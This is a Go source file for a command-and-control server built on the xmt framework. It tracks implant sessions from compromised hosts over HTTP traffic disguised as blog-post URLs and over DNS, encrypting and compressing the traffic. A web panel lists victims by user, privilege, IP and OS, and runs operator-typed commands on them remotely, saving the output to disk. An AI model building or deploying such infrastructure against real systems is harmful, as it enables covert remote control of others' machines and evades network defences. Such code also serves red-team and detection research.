package main

import (
	"fmt"
	"html"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/iDigitalFlame/logx/logx"
	"github.com/iDigitalFlame/xmt/xmt/c2"
	"github.com/iDigitalFlame/xmt/xmt/c2/control"
	"github.com/iDigitalFlame/xmt/xmt/c2/transform"
	"github.com/iDigitalFlame/xmt/xmt/c2/wrapper"
	"github.com/iDigitalFlame/xmt/xmt/com"
	"github.com/iDigitalFlame/xmt/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/xmt/com/udp"
	"github.com/iDigitalFlame/xmt/xmt/com/web"
	"github.com/iDigitalFlame/xmt/xmt/crypto/cbk"
	"github.com/iDigitalFlame/xmt/xmt/device"
	"github.com/iDigitalFlame/xmt/xmt/util"
)

const (
	htmlClientDetails = `
<div id="client">
	<div class="label">Session ID:</div><div id="serial">%[1]s</div>
	<div class="label">OS:</div><div id="os">%[2]s</div>
	<div class="label">User:</div><div id="user">%[3]s</div>
	<div class="label">IP:</div><div id="ip">%[4]s</div>
	<div class="label">Last Packet:</div><div id="last">%[5]s</div>
	<div class="label">First Packet:</div><div id="created">%[6]s</div>
	<div class="label">Sleep/Jitter:</div><div id="sleep">%[7]s/%[8]d</div>
<div>
<div id="client_input">
	<form method="post" action="%[9]s">
		<input type="text" name="command" />
		<input type="submit" value="submit" />
	</form>
</div>

`
	htmlClientJobStart = `<div id="jobs">`
	htmlClientJobEnd   = `</div>`

	htmlClientJob = `
<div class="job">
	<div class="jid">%[1]X</div>
	<div class="jstart">%[2]s</div>
	<div class="jend">%[3]s</div>
	<div class="jpayload">
		<a href="/c/%[4]s">%[5]s</a>
	</div>
</div>
`

	header = `
<html>
	<head>
		<title>%s</title>
		<style type="text/css">


		</style>
	</head>
	<body>
		<div id="main">
`
	footer = `
		</div>
	</body>
</html>
`
	clientsListHeader = `
<table><tr><td>ID</td><td>IP</td><td>Hostname</td><td>User</td><td>OS</td><td>Last</td><td>Start</td><td>Sleep</td></tr>
`
	clientsListFooter = `
</table>
`
)

const (
	null    = rune(0)
	quote   = rune('"')
	space   = rune(' ')
	single  = rune('\'')
	escaped = string("\\")
)

var (
	bufs = &sync.Pool{
		New: func() interface{} {
			return new(strings.Builder)
		},
	}

	webC2Profile = &c2.Profile{
		Jitter: 0,
		Sleep:  time.Duration(10) * time.Second,
		Wrapper: wrapper.NewMulti(
			_cbk,
			_gzip,
		),
		Transform: transform.Base64,
	}
	webC2Generator = &web.Generator{
		URL:  util.Matcher("/post/%31d/%12d/%31d/edit/%4fl"),
		Host: util.Matcher("%6fl.myblogsite.com"),
	}

	dnsC2Profile = &c2.Profile{
		Jitter: 0,
		Sleep:  time.Duration(10) * time.Second,
		Wrapper: wrapper.NewMulti(
			_cbk,
			_gzip,
		),
		Transform: transform.DNS,
	}

	c1, c3 = cbk.NewCipher(75), cbk.NewCipher(75)

	_cbk, _  = wrapper.NewCrypto(c1, c3)
	_gzip, _ = wrapper.NewGzip(7)
)

type client struct {
	l    sync.RWMutex
	h    *c2.Session
	jobs []*clientJob
}
type clientJob struct {
	h    *c2.Job
	c    *controller
	pid  uint64
	file string
}
type clientList struct {
	t []*client
	m map[string]*client
	l sync.RWMutex
}

func (c *client) IP() string {
	if i := strings.Split(c.h.Remote(), ":"); len(i) >= 1 {
		return i[0]
	}
	return c.h.Remote()
}
func (c *client) User() string {
	if !c.h.Device.Elevated {
		return c.h.Device.User
	}
	return fmt.Sprintf("*%s", c.h.Device.User)
}
func (c *clientList) addClient(x *c2.Session) {
	c.l.Lock()
	defer c.l.Unlock()
	n := strings.ToUpper(x.ID.String())
	if u, ok := c.m[n]; ok {
		u.h = x
		return
	}
	i := &client{
		h:    x,
		jobs: make([]*clientJob, 0),
	}
	c.m[n] = i
	c.t = append(c.t, i)
	i.h.Time(time.Duration(30)*time.Second, 40)
}
func (c *client) newExecuteJob(s string, x *controller) {
	c.l.Lock()
	j, _ := c2.Schedule(
		c.h,
		control.Run(&control.Command{
			Args: ParseArgs(s, escaped, true),
		}),
	)
	n := &clientJob{
		h: j,
		c: x,
	}
	j.Done, j.Error = n.finish, n.finish
	c.jobs = append(c.jobs, n)
	c.l.Unlock()
}
func (j *clientJob) finish(s *c2.Session, p *com.Packet) {
	j.file = filepath.Join(j.c.dir, fmt.Sprintf("%s-%X.txt", s.Device.Hostname, p.Job))
	f, err := os.OpenFile(j.file, os.O_CREATE|os.O_APPEND|os.O_RDWR, 0644)
	if err != nil {
		return
	}
	if j.h.Initial.ID == c2.MsgExecute {
		p.Bool()
		if err := p.ReadUint64(&(j.pid)); err != nil {
			return
		}
	}
	io.Copy(f, p)
	f.Close()
	j.h.Result, j.h.Initial = nil, nil
}

type packet struct {
	packet   *com.Packet
	received time.Time
}
type controller struct {
	fs      http.Handler
	dir     string
	lock    sync.RWMutex
	sorter  *time.Timer
	packets []*packet
	clients *clientList
	*http.Server
}

/*
func (a active) Len() int {
	return len(a)
}
func (c *controller) sort() {
	c.lock.Lock()
	defer c.lock.Unlock()
	sort.Sort(c.)
}
*/

/*
func (a active) Swap(i, j int) {
	a[i], a[j] = a[j], a[i]
}
func (a active) Less(i, j int) bool {
	return a[i].Last.After(a[j].Last)
}
*/
func (c *controller) httpClientAll(b *strings.Builder) {
	b.WriteString(clientsListHeader)
	c.clients.l.RLock()
	for x := range c.clients.t {
		fmt.Fprintf(b,
			`<tr><td><a href="/%[1]s">%[1]s</a></td><td>%[2]s</td><td>%[3]s</td><td>%[4]s</td><td>%[5]s<td>%[6]s</td><td>%[7]s</td><td>%[8]s/%[9]d</td></tr>`,
			c.clients.t[x].h.ID,
			c.clients.t[x].IP(),
			c.clients.t[x].h.Device.Hostname,
			c.clients.t[x].User(),
			c.clients.t[x].h.Device.Version,
			c.clients.t[x].h.Last.Format(time.Stamp),
			c.clients.t[x].h.Created.Format(time.Stamp),
			c.clients.t[x].h.Sleep,
			c.clients.t[x].h.Jitter,
		)
	}
	c.clients.l.RUnlock()
	b.WriteString(clientsListFooter)
}
func (*controller) httpHeader(s string) *strings.Builder {
	b := bufs.Get().(*strings.Builder)
	fmt.Fprintf(b, header, html.EscapeString(s))
	return b
}
func (*controller) httpFooter(b *strings.Builder, w io.Writer) {
	b.WriteString(footer)
	fmt.Fprintf(w, b.String())
	b.Reset()
	bufs.Put(b)
}
func (c *controller) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if p := strings.Split(r.URL.Path, "/"); len(p) == 0 || p[0] != "os" {
		c.httpClient(w, r)
	} else {

	}
}
func (c *controller) httpClient(w http.ResponseWriter, r *http.Request) {
	var b *strings.Builder
	m := strings.Split(r.URL.Path, "/")
	if len(m) == 0 || (len(m) >= 2 && len(m[1]) == 0) {
		b = c.httpHeader("Clients List")
		c.httpClientAll(b)
	} else if len(m) >= 2 {
		if m[1] == "c" {
			c.fs.ServeHTTP(w, r)
			return
		}
		b = c.httpHeader(fmt.Sprintf("Client %s", m[1]))
		c.httpClientSingle(m[1], b, r)
	}
	if b == nil {
		return
	}
	c.httpFooter(b, w)
}
func (c *controller) httpClientSingle(s string, b *strings.Builder, r *http.Request) {
	x, ok := c.clients.m[strings.ToUpper(s)]
	if !ok {
		fmt.Fprintf(b, "Client ID %s not found!", html.EscapeString(s))
		return
	}
	if r.Method == http.MethodPost && r.ParseForm() == nil {
		if e := r.Form.Get("command"); len(e) > 0 {
			x.newExecuteJob(e, c)
		}
	}
	fmt.Fprintf(b, htmlClientDetails,
		strings.ToUpper(x.h.ID.String()),
		x.h.Device.Version, x.User(),
		x.IP(),
		x.h.Last.Format(time.Stamp),
		x.h.Created.Format(time.Stamp),
		x.h.Sleep.String(), x.h.Jitter,
		r.URL.Path,
	)
	b.WriteString(htmlClientJobStart)
	for i := range x.jobs {
		var y string
		if !x.jobs[i].h.Complete.IsZero() && x.jobs[i].h.IsDone() {
			y = x.jobs[i].h.Complete.Format(time.Stamp)
		}
		fmt.Fprintf(b, htmlClientJob,
			x.jobs[i].h.ID,
			x.jobs[i].h.Start.Format(time.Stamp),
			y, strings.Replace(x.jobs[i].file, c.dir, "", -1),
			x.jobs[i].file,
		)
	}
	b.WriteString(htmlClientJobEnd)
}

func main() {

	c1.A, c1.B, c1.C, c1.D = 99, 10, 45, 17
	c3.A, c3.B, c3.C, c3.D = 99, 10, 45, 17

	limits.Limits = &limits.Limit{
		Frag:   8096,
		Small:  1024,
		Large:  8192,
		Medium: 8192,
	}

	c2.DefaultLogLevel = logx.LTrace

	t := time.Second * 5
	c := &controller{
		fs:  http.FileServer(http.Dir("/tmp/xmt/")),
		dir: "/tmp/xmt/",
		clients: &clientList{
			t: make([]*client, 0),
			m: make(map[string]*client),
		},
		packets: make([]*packet, 0),
		Server: &http.Server{
			Addr:              "0.0.0.0:8080",
			Handler:           &http.ServeMux{},
			ReadTimeout:       t,
			IdleTimeout:       t,
			WriteTimeout:      t,
			ReadHeaderTimeout: t,
		},
	}
	c.Server.Handler.(*http.ServeMux).Handle("/", c)

	l := web.New(t)
	l.Handle("/", http.NotFoundHandler())
	l.Rule(&web.Rule{
		URL:  webC2Generator.URL.(util.Matcher).Match(),
		Host: webC2Generator.Host.(util.Matcher).Match(),
	})

	q, err := c2.Listen("http", "0.0.0.0:80", l, webC2Profile)
	if err != nil {
		panic(err)
	}
	q.Register = c.clients.addClient
	q.Oneshot = c.onh

	q1, err := c2.Listen("dns", "0.0.0.0:53", udp.Raw, dnsC2Profile)
	if err != nil {
		panic(err)
	}
	q1.Register = c.clients.addClient
	q1.Oneshot = c.onh

	panic(c.Server.ListenAndServe())
}

func (c *controller) onh(s *c2.Session, p *com.Packet) {
	f, err := os.OpenFile(
		filepath.Join(c.dir, fmt.Sprintf("onp-%s-%X.txt", p.Device.String(), util.Rand.Int63())),
		os.O_CREATE|os.O_APPEND|os.O_RDWR,
		0644,
	)
	if err != nil {
		return
	}
	io.Copy(f, p)
	f.Close()
}

// ParseArgs attempts to create a string array from the supplied string value. The escape parameter specifies a
// string that contains escape characters. The boolean include value specifies if the escape characters are included
// with the resulting string array values.
func ParseArgs(val, escape string, include bool) []string {
	u := null
	r := []string{}
	y, e := []rune{}, make(map[rune]bool)
	q, c, j, n, p := -1, -1, -1, -1, false
	if len(escape) > 0 {
		for _, r := range escape {
			e[r] = true
		}
	}
	for i, v := range device.Expand(val) {
		switch v {
		case space:
			if q != -1 || j != -1 || n != -1 {
				n = -1
				y = append(y, v)
				continue
			}
			if c == -1 {
				c = i + 1
			} else {
				c = -1
			}
			if len(y) > 0 {
				r = append(r, string(y))
				y = []rune{}
			}
		case quote:
			if j != -1 {
				y = append(y, v)
				continue
			}
			u = null
			if n > -1 && n == i-1 {
				n = -1
				y = append(y, v)
				continue
			}
			if q == -1 {
				q = i + 1
				if i-1 > 0 && rune(val[i-1]) != space {
					y = append(y, v)
					continue
				}
			} else {
				if q-2 > 0 {
					if (i+1 <= len(val) && rune(val[q-2]) != space) || i+1 > len(val) {
						y = append(y, v)
						continue
					}
					if q-2 > 0 && rune(val[q-2]) != space {
						y = append(y, v)
						p = true
					}
					if !p && i+1 <= len(val) && rune(val[q-2]) != space {
						y = append(y, v)
						p = true
					}
				}
				q = -1
			}
			if len(y) > 0 {
				if q == -1 && !p && include {
					r = append(r, fmt.Sprintf("\"%s\"", string(y)))
				} else {
					r = append(r, string(y))
					p = false
				}
				y = []rune{}
			} else {
				if q == -1 {
					r = append(r, fmt.Sprintf("\"%s\"", string(y)))
				}
			}
		case single:
			if q != -1 {
				y = append(y, v)
				continue
			}
			u = null
			if n > -1 && n == i-1 {
				n = -1
				y = append(y, v)
				continue
			}
			if j == -1 {
				j = i + 1
				if i-1 > 0 && rune(val[i-1]) != space {
					y = append(y, v)
					continue
				}
			} else {
				if j-2 > 0 {
					if (i+1 <= len(val) && rune(val[j-2]) != space) || i+1 > len(val) {
						y = append(y, v)
						continue
					}
					if j-2 > 0 && rune(val[j-2]) != space {
						y = append(y, v)
						p = true
					}
					if !p && i+1 <= len(val) && rune(val[j-2]) != space {
						y = append(y, v)
						p = true
					}
				}
				j = -1
			}
			if len(y) > 0 {
				if j == -1 && !p {
					r = append(r, fmt.Sprintf("'%s'", string(y)))
				} else {
					r = append(r, string(y))
					p = false
				}
				y = []rune{}
			} else {
				if j == -1 {
					r = append(r, fmt.Sprintf("'%s'", string(y)))
				}
			}
		default:
			if u != null {
				y = append(y, u)
				u = null
			}
			if _, ok := e[v]; ok {
				n = i
				if include {
					y = append(y, v)
				} else {
					u = v
				}
			} else {
				y = append(y, v)
			}
		}
	}
	if len(y) > 0 {
		r = append(r, string(y))
	}
	return r
}
